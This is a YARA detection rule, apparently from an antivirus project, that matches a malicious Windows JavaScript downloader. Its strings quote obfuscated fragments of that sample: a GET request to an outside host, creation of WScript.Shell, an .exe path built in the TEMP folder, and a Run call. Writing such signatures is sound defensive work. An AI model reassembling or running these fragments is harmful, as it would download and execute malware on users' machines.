rule sig_20160401_f849c9506ec64fa509228df5cb8728ae {
  meta:
    description = "datamaliciousorder - file 20160401_f849c9506ec64fa509228df5cb8728ae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7dd3b600e0bc70cf338f7977e60fd6a266183c63cb8cb602b7f847e66fa43ef3"

  strings:
    $s1  = "WnvLnb[QjEej](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function QpwVmu(JfiIiq, PhjKq){OkMk = OkMk * 1; return JfiIiq - PhjKq;};" fullword ascii
    $s3  = "var LzAb = function MkwCw() {return WScript[BrtYm](\"WScript\"+\".Shell\");}(), ZwsMa = 11;" fullword ascii
    $s4  = "if (WnvLnb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WvcVk(){return BqTmv + \"\";};" fullword ascii
    $s6  = "function TkcJg() {return LzAb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vh72fP39kTKIZ.ex\" + \"e\";};" fullword ascii
    $s7  = "function JiNk() {return ((ExRs == true) && (ExRs == FnGk)) ? 1 : OkMk;};" fullword ascii
    $s8  = "if (ExRs && JiNk() && FnGk){" fullword ascii
    $s9  = "var KzTif = false;" fullword ascii
    $s10 = "ExRs = true; " fullword ascii
    $s11 = "return QpwVmu(FjMeo, JybKi);" fullword ascii
    $s12 = "var ExRs = false;" fullword ascii
    $s13 = "var FnGk = false;" fullword ascii
    $s14 = "FnGk = true; " fullword ascii
    $s15 = "var GzVd = new this[\"Date\"]();" fullword ascii
    $s16 = "function XsLa(MhVpe) {var NbrNm = (1, 2, 3, 4, 5, MhVpe); return NbrNm;};" fullword ascii
    $s17 = "function RvfLk()" fullword ascii
    $s18 = "function AoFb(){return 23;};" fullword ascii
    $s19 = "function DrPkw(AsxRa){LzAb[\"R\"+\"un\"](AsxRa, OkMk, OkMk);};" fullword ascii
    $s20 = "}while (JjZyf);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}